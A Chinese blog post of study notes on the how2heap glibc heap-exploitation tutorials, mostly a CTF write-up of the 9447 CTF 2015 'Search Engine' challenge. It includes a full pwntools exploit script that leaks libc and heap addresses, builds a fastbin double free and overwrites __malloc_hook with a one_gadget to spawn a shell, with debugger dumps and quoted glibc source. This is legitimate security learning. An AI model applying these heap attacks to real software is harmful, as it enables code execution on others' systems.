---
layout:     post
title:      "how2heap学习（一）"
date:       2019-06-06
author:     "Ambi9u0us"
catalog: true
tags:
    - how2heap
    - pwn
    - glibc
---
# how2heap学习（一）

## 前言

how2heap是**shellphish**团队在Github上开源的堆漏洞系列教程（[项目地址在此](<https://github.com/shellphish/how2heap>)），是对堆进行学习检验比较好的项目，在学习前后参考了华庭大佬学写的**“Glibc内存管理-Ptmalloc2源码分析”**，这对于进一步理解整个堆的内存分配与管理十分有作用，[链接地址](https://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf)

## 习题

## 1	first_fit

`first_fit`主要是展示堆的`free()`并没有真正地返还给系统，而是将其进行了管理，在华庭写的分析中有说到，使用的是一个叫做bins的数组，然后再进行申请时会优先从bins所管理的空间中进行分配。

在`first_fit`中，由于只对a进行了释放，此时bins数组中只存在刚刚释放的a所在的chunk，需要注意的是此时的a所在chunk实际是在unsorted bin中，而在后面的申请中，只要申请空间小于此时a的chunk大小，那么肯定会被分配这个chunk，同时由于此时整个堆空间（arena）中只有这一个chunk，所以实际上即使申请的空间在fastbin范围内，但由于此时fastbin中并没有chunk存在，所以也会被分配这一个chunk。从而实现了一个最简单的uaf。

## 2	fastbin_dup

`fastbin_dup`利用fastbin实现了一个double free，说明了当一个fastbin不在fastbins的链表头的话，就可以再次分配（并且还能多次进行分配）。

## 3	fastbin_dup_into_stack

`fastbin_dup_into_stack`相比于前面的`fastbin_dup`主要是实现double free之后，在fastbin的链表后面加了一个虚假的chunk，将栈的地址写入到了这个fastbin之中，而这个地址可以是任意我们可以读写的地址。主要过程可以简化为：

```
malloc=>a
malloc=>b
free a
free b
free a
malloc=>c(a)
malloc=>d(b)
rewrite c->fd=fake_value
malloc=>e(a)
malloc=>fake_value
```

需要注意的是，在这里要保证fake_value对应的size大小应该与现在的fastbin的size一样，源码中的*d(此时的c)指代的就是正处于fastbin中的chunk的fd指针，而修改后，fd指针指向了栈中，然后再次进行malloc，得到的地址就是fd指向地址加0x10。

### 3.1	9447 CTF 2015: Search Engine

使用Index_sentence添加句子，使用malloc开辟一个堆存储句子，并且根据句子中单词个数存储了若干个Word结构体，每次将新的Word结构体插入到前一个的前面，形成一个链表，表头存储在全局变量0x6020b8中。该Word结构体大致如下所示：

```c
struct Word{
    char *word_ptr;
    int word_size;
    int unused_padding1;
    char *sentence;
    int sentence_size;
    int unused_padding2;
    struct Word *next;
}
```

用Search_word搜索输入的word所在的句子，此时使用malloc开辟一个堆存储要搜索的单词，找到后如果选择删除，将会把word中记录sentence内容清空变为\x00，并free掉，但是该地址的索引并没有删除，仍然存在。此外，不论是否将存储句子的堆块free掉，每次搜索完都会将存储待搜索单词的堆块free掉。

从网上寻找writeup，得到exp如下：

```python
#!/usr/bin/env python

from mypwn import *

#context.log_level = "debug"

p,elf,libc = init_pwn("./search-bf61fbb8fa7212c814b2607a81a84adf","","",[0x400b0b,0x400c3a,0x400b46,0x400bcb,0x400bed,0x400d13],False)

def search(word, s):
    p.recvuntil("3: Quit\n")
    p.sendline("1")
    p.recvline("Enter the word size:")
    p.sendline(str(len(word)))
    p.recvline("Enter the word:")
    p.send(word)
    if (s != ""):
        p.sendline(str(s))
        return p.recvline()

def index(word):
    p.recvuntil("3: Quit\n")
    p.sendline("2")
    p.recvline("Enter the sentence size:")
    p.sendline(str(len(word)))
    p.send(word)

index("a "+"a"*14)	#1 byte for search
search("a", "y")
index("A"*0x80)
search("A"*0x80, "y")	
# for the sentence
libc_base = u64(search("\x78", "n")[10:18])-0x3c4b78
log.info("libc_base: " + hex(libc_base))
#fastbin:0
#smallbin:1
index("b "+"b"*14)	#a(0)
index("c "+"c"*14)	#b
search("b", "y")	#c	a(0)->c
search("c", "y")	#d(c)	a(0)->b->d(c)

heap_base = u64(search("\x10", "n")[10:18]) - 0x1010	#first chunk - 0x1010 = heapbase
log.info("heap_base: " + hex(heap_base))

index("bbbb "+"b"*0x5b)	#4 bytes for replace	and top chunk +0xd0
index("cccc "+"c"*0x5b)	#top chunk + 0xd0
index("dddd "+"d"*0x5b)	#top chunk + 0xd0
search("bbbb", "y")
search("cccc", "y")
search("dddd", "y")

search(p32(heap_base+0x11c0), "y")

# malloc_hook
payload = p64(libc_base + 0x3c4aed)	#__malloc_hook - 0x13

# free hook
# payload = p64(libc_base+0x3c6795)
index(payload+p8(0)*0x58)
index("B"*0x60)
index("C"*0x60)

payload = p8(0)*3
payload += p64(0)*2		#0x13 bytes
payload += p64(libc_base+0xcd0f3)	#one_gadget
payload += "\x00"*(0x60-len(payload))
index(payload)			#when malloc the struct word(0x40), it will jump to one_gadget

p.interactive()
```
#### 3.1.0	读取size大小时无NULL结尾导致可以实现栈泄露
在调用Index函数创建单词时，有一个函数`read_num`用于读取输入字符串的长度，当输入的不是字符不是数字时将会输出字符，并提醒重新输入，但是上一次输入的字符仍然会存储在栈中，并且结尾不会添加NULL字符，同时会将字符存储的地址存在开始字符的前8个字节处。这样，当第二次输入时将此时的数组空间（40 bytes）占满，那么输出字符时，由于没有NULL字符截断，就会在40个字符后面紧跟着将栈地址输出，实现栈地址泄露：
```python
def leak_stack():
    p.sendline('A'*4)
    p.recvuntil('Quit\n')
    p.recvline()

    p.sendline('A'*48)
    leak = p.recvline().split(' ')[0][48:]
    return int(leak[::-1].encode('hex'), 16)
```
不过这个漏洞在本次分析的exp中并没有用到，写在这里权作记录。
#### 3.1.1	libc地址泄露

在exp中，libc地址泄露的方法是通过unsorted bin attack得到。

首先通过第一个index和search，可以得到两个0x20大小的fastbin：

```shell
Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0xb3a0a0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0xb3a020, size=0x20, flags=PREV_INUSE) 
```

然后通过index函数maloc两个0x90的堆块，再调用search函数，先将存储句子的那个堆块释放，得到了一个unsorted bin：

```shell
[+] unsorted_bins[0]: fw=0xb3a0b0, bk=0xb3a0b0
 →   Chunk(addr=0xb3a0c0, size=0x90, flags=PREV_INUSE)
```

这个bin是紧跟第二个0x20的堆块后面进行malloc调用的，因此内存地址是连续的，这时如果触发函数`malloc_consolidate`，就会将两个fastbin全部转移到unsorted bin中，原因见源码(此处为glibc2.23中的malloc.c)中这一段：

```c
	do {
	  check_inuse_chunk(av, p);
	  nextp = p->fd;

	  /* Slightly streamlined version of consolidation code in free() */
	  size = p->size & ~(PREV_INUSE|NON_MAIN_ARENA);
	  nextchunk = chunk_at_offset(p, size);
	  nextsize = chunksize(nextchunk);

	  if (!prev_inuse(p)) {
	    prevsize = p->prev_size;
	    size += prevsize;
	    p = chunk_at_offset(p, -((long) prevsize));
	    unlink(av, p, bck, fwd);
	  }

	  if (nextchunk != av->top) {
	    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

	    if (!nextinuse) {
	      size += nextsize;
	      unlink(av, nextchunk, bck, fwd);
	    } else
	      clear_inuse_bit_at_offset(nextchunk, 0);

	    first_unsorted = unsorted_bin->fd;
	    unsorted_bin->fd = p;
	    first_unsorted->bk = p;

	    if (!in_smallbin_range (size)) {
	      p->fd_nextsize = NULL;
	      p->bk_nextsize = NULL;
	    }

	    set_head(p, size | PREV_INUSE);
	    p->bk = unsorted_bin;
	    p->fd = first_unsorted;
	    set_foot(p, size);
	  }

	  else {
	    size += nextsize;
	    set_head(p, size | PREV_INUSE);
	    av->top = p;
	  }

	} while ( (p = nextp) != 0);
```

当触发`malloc_consolidate`函数时，将会把fastbin合并到unsorted bin，同时从代码中的循环可以看出被合并的fastbin后面的bin也将全部被转移到unsorted bin中。

而`malloc_consolidate`触发的条件在代码注释中也已经注明：

```c
    /*
      If freeing a large space, consolidate possibly-surrounding
      chunks. Then, if the total unused topmost memory exceeds trim
      threshold, ask malloc_trim to reduce top.

      Unless max_fast is 0, we don't know if there are fastbins
      bordering top, so we cannot tell for sure whether threshold
      has been reached unless fastbins are consolidated.  But we
      don't want to consolidate on each free.  As a compromise,
      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD
      is reached.
    */
    if ((unsigned long)(size) >= FASTBIN_CONSOLIDATION_THRESHOLD) {
      if (have_fastchunks(av))
	      malloc_consolidate(av);
```

同时根据华庭写的《glibc内存管理ptmalloc源代码分析》可以知道：如果合并后的 chunk 大小大于 FASTBIN_CONSOLIDATION_THRESHOLD（本题中为64k），并且 fast bins 中存在空闲 chunk，调用`malloc_consolidate()`函数合并 fast bins 中的空闲 chunk 到 unsorted bin 中。 上面给出的exp采用的办法（也是一种常用的办法），就是想办法让要释放的堆块紧挨top chunk，这样该堆块free时就会与top chunk合并，从而使合并后的chunk大于threshold，实现对`malloc_consolidate`函数的触发（这一解释看mutepig的要更清楚一点，[链接]([http://blog.leanote.com/post/mut3p1g/Linux%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-2](http://blog.leanote.com/post/mut3p1g/Linux堆基础知识-2))）。因此得到了两个unsorted bin：

```shell
[+] unsorted_bins[0]: fw=0xb3a010, bk=0xb3a090
 →   Chunk(addr=0xb3a020, size=0x20, flags=PREV_INUSE)   →   Chunk(addr=0xb3a0a0, size=0xb0, flags=PREV_INUSE)
[+] Found 2 chunks in unsorted bin.
```

显然，此时的0xb3a020处的unsorted bin的bk指针指向main_arena+88，根据经验此时的地址后三位必定是b78。另外前面构造的Word结构体并没有被free掉，并且word_ptr指向的地址索引也没有改变，第一个单词指向的地址就是第一个句子最开始的堆地址，也就是现在的0xb3a020，而这个地址就是unsorted bin的fd指针。

然后，exp调用search函数搜索0x78，这里会先malloc一个0x20的堆块，由于此时fastbin与smallbin中并没有空闲chunk，因此将会在unsorted bin中寻找，这里要注意的是寻找时是从最后一个unsorted bin开始，将其取作victim进行操作，若不被分配则将其从unsorted bin中去除，放入对应大小的bins中，若victim大小与需求的大小完全相同，则直接分配，并且停止遍历unsorted bin。

```c
  for (;; )
    {
      int iters = 0;
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))   //the first victim is the last unsorted bin
        {
          bck = victim->bk;
          if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
              || __builtin_expect (victim->size > av->system_mem, 0))
            malloc_printerr (check_action, "malloc(): memory corruption",
                             chunk2mem (victim), av);
          size = chunksize (victim);

          /*
             If a small request, try to use last remainder if it is the
             only chunk in unsorted bin.  This helps promote locality for
             runs of consecutive small requests. This is the only
             exception to best-fit, and applies only when there is
             no exact fit for a small chunk.
           */

          if (in_smallbin_range (nb) &&
              bck == unsorted_chunks (av) &&
              victim == av->last_remainder &&
              (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
            {
              /* split and reattach remainder */
              remainder_size = size - nb;
              remainder = chunk_at_offset (victim, nb);
              unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
              av->last_remainder = remainder;
              remainder->bk = remainder->fd = unsorted_chunks (av);
              if (!in_smallbin_range (remainder_size))
                {
                  remainder->fd_nextsize = NULL;
                  remainder->bk_nextsize = NULL;
                }

              set_head (victim, nb | PREV_INUSE |
                        (av != &main_arena ? NON_MAIN_ARENA : 0));
              set_head (remainder, remainder_size | PREV_INUSE);
              set_foot (remainder, remainder_size);

              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
```

得到一个small bin：

```shell
[+] small_bins[10]: fw=0xb3a090, bk=0xb3a090
 →   Chunk(addr=0xb3a0a0, size=0xb0, flags=PREV_INUSE)
[+] Found 1 chunks in 1 small non-empty bins.
```

同时，在0xb3a0a0这个small bin被剔除出unsorted bin时，0xb3a020的fd指针指向了main_arena+88，见代码：

```c
          /* remove from unsorted list */
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);
```

所以，此时的0xb3a020处存储了main_arena+88的地址，又由于这个地为第一个Word结构体的word_ptr指向的地址，所以后续对0x78的搜索正好就能找到0xb3a020，从而泄露出libc的基址。

```shell
[*] libc_base: 0x7fbfaf7d3000
```

将存储搜索0x78的堆释放后，再次得到一个fastbin：

```shell
Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0xb3a020, size=0x20, flags=PREV_INUSE)
```

#### 3.1.2	heap基址泄露

首先，此时bins中仅有一个fastbin和small bin，在第一次调用Index函数时，先是malloc一个0x20的堆块存储第一个句子，该堆块从fastbin中分配，然后malloc了两个0x30作为Word结构体的堆块，这两个堆块第一个从small bin中取出，通过拆分的方法，拆分未被使用的堆块在unsorted bin中，然后第二个从unsorted bin中取出，拆分后剩下的堆块位于unsorted bin：
```shell
[+] unsorted_bins[0]: fw=0xb3a0f0, bk=0xb3a0f0
 →   Chunk(addr=0xb3a100, size=0x50, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
```

small bin分配时的代码如下：

```c
  if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        {
          if (victim == 0) /* initialization check */
            malloc_consolidate (av);
          else
            {
              bck = victim->bk;
	if (__glibc_unlikely (bck->fd != victim))
                {
                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }
              set_inuse_bit_at_offset (victim, nb);
              bin->bk = bck;
              bck->fd = bin;

              if (av != &main_arena)
                victim->size |= NON_MAIN_ARENA;
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
        }
    }
```

因此，进行第二次Index函数的调用时，分配给第二个句子的堆块地址从拆分后放到unsorted bin的堆获取，malloc之后，bins中仅存在一个unsorted bin：

```sh
[+] unsorted_bins[0]: fw=0xb3a110, bk=0xb3a110
 →   Chunk(addr=0xb3a120, size=0x30, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
```

然后分配给第一个Word结构体堆块后，bins中无堆块，当malloc第二个Word结构体堆块时，从top chunk中获取内存，top chunk起始地址加0x30。

然后调用search函数free掉第一个句子的堆块（第一个Word结构体的word_ptr指向该地址），在free之前，又malloc了一个0x20存放所搜索单词的堆块，从top chunk中获取内存空间。此时得到一个fastbin：

```shell
Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0xb3a020, size=0x20, flags=PREV_INUSE) 
```

然后再free单词所在堆块，结果为：

```c
Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0xb3a1b0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0xb3a020, size=0x20, flags=PREV_INUSE)
```

然后再一次调用search函数，malloc一个堆块存储单词，直接从fastbin中分配，然后free掉的二哥句子所在堆块，此时fastbin情况为：

```shell
Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0xb3a100, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0xb3a020, size=0x20, flags=PREV_INUSE)
```

再次free掉单词堆块：

```shell
Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0xb3a1b0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0xb3a100, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0xb3a020, size=0x20, flags=PREV_INUSE)
```

此时0xb3a100这个fastbin指向第一个堆块0xb3a020这个堆块，指向的地址为该堆块的头0xb3a010，而这个地址减去0x1010就是heapbase，同时0xb3a100作为之前存储“c cccccccccccccc”句子的堆块，自然作为一个Word结构体的word_ptr的值而存在，因此调用search函数搜索0x10，即可获取到0xb3a010这个值，从而泄露出heapbase。

```shell
[*] heap_base: 0xb39000
```

然后free掉本次搜索单词所在堆块，bins中余下3个fastbin：

```shell
Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0xb3a1b0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0xb3a100, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0xb3a020, size=0x20, flags=PREV_INUSE)
```

#### 3.1.3	覆写__malloc_hook到one_gadget
在泄露了heap_base之后，exp调用了三次index函数，创建了3个存储句子的0x70的堆块，同时还malloc了6个0x30的Word结构体堆块，在这之后，top chunk的地址也增加了`0xd0 * 3`即0x270，然后调用三次search函数搜索单词，最后将3个存储句子的0x70大小的堆块free到fastbin中，此时fastbin的情形如下：

```shell
Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0xb3a1b0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0xb3a100, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0xb3a020, size=0x20, flags=PREV_INUSE) 
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0xb3a370, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0xb3a2a0, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0xb3a1d0, size=0x70, flags=PREV_INUSE) 
Fastbins[idx=6, size=0x70] 0x00
```

然后搜索heapbase+0x11c0（此时为0xb3a1c0），是为了double free中间0xb3a2a0这个chunk。原因是此时0xb3a2a0这个chunk作为存储句子的堆块，肯定是在Word结构体链表中作为word_ptr存在的，因此搜索单词肯定会遍历到这个地址，同时，0xb3a2a0处存储的是这个chunk的fd指针，指向下一个chunk，值为0xb3a1c0，因此通过搜索这个地址值，就可以实现对中间chunk的double free。而之前构造句子时构造4个字符的单词也是为了使后面与4个字节的地址比较能够返回成功进入到删除将sentence的chunk释放的流程，同理前面构造1个字符的单词原理类似。

值得一说的是，在进入删除句子流程后，由于对chunk释放前调用了memset，将里面的数据全部置0，导致该chunk指向下一个chunk的fd指针也被清0，因此导致fastbin顶部的那个chunk被剔除出了fastbin中，这个chunk将成为野堆块，在本体中将只能通过搜索单词想办法找到并free，无法通过malloc将其引用到。

整个搜索函数运行完毕后，将构造好一个循环的fastbin链表，此时fastbin情况如下所示：

```shell
Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0xb3a1b0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0xb3a100, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0xb3a020, size=0x20, flags=PREV_INUSE) 
Fastbins[idx=1, size=0x20] 0x00
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] 0x00
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0xb3a2a0, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0xb3a370, size=0x70, flags=PREV_INUSE)  ←  Chunk(addr=0xb3a2a0, size=0x70, flags=PREV_INUSE)  →  [loop detected]
Fastbins[idx=6, size=0x70] 0x00
```

在构造好了循环链表后，就是要申请一个相同size的堆块，并且使其fd指针指向`__malloc_hook`附近，这里选取的是`__malloc_hook - 0x23`处，也即libc_base + 0x3c4aed，使用index函数进行构造，得到该chunk处内存如下所示：

```shell
gef➤  telescope 0xb3a2a0
0x0000000000b3a2a0│+0x0000: 0x00007fbfafb97aed  →  0xbfafb96260000000	 ← $r12
0x0000000000b3a2a8│+0x0008: 0x0000000000000000
0x0000000000b3a2b0│+0x0010: 0x0000000000000000
0x0000000000b3a2b8│+0x0018: 0x0000000000000000
0x0000000000b3a2c0│+0x0020: 0x0000000000000000
0x0000000000b3a2c8│+0x0028: 0x0000000000000000
0x0000000000b3a2d0│+0x0030: 0x0000000000000000
0x0000000000b3a2d8│+0x0038: 0x0000000000000000
0x0000000000b3a2e0│+0x0040: 0x0000000000000000
0x0000000000b3a2e8│+0x0048: 0x0000000000000000
```

然后调用两次index函数将两个chunk从fastbin中取出，最后构造的`__malloc_hook`附近的fake_addr作为下一个chunk存在于fastbin里：

```shell
Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0x7fbfafb97afd, size=0x78, flags=PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)  ←  [Corrupted chunk at 0xbfaf858e20000010]
```

此时再次调用一次index函数，并将one_gadget的地址写入`__malloc_hook`的地址，这样在下一次调用malloc构建Word结果体时，就会触发`__malloc_hook`的机制，执行`__malloc_hook`所指向的地址处的函数，此时为one_gadget，从而get shell。

触发`__malloc_hook`机制的代码如下：

```c
void *(*hook) (size_t, const void *)
    = atomic_forced_read (__malloc_hook);
  if (__builtin_expect (hook != NULL, 0))
    return (*hook)(bytes, RETURN_ADDRESS (0));
```

至于`one_gadget`的定义与查找工具，可以查看<https://github.com/david942j/one_gadget>，进行学习了解。

## 后记

9447这道题属于在[fastbin_dup_into_stack.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_into_stack.c)的拓展习题，断断续续分析这道题的exp我花了大概半个月之久，根本原因在于并没有对堆的内存管理有足够清晰的认识就开始做题，再加上调试的时候方法不对导致一直没有看懂别人的exp，在这里感谢某位不愿意透露ID的大佬，是在他的帮助下我才很快弄懂整个exp的执行流程，并对fastbin attack有了较清晰的理解。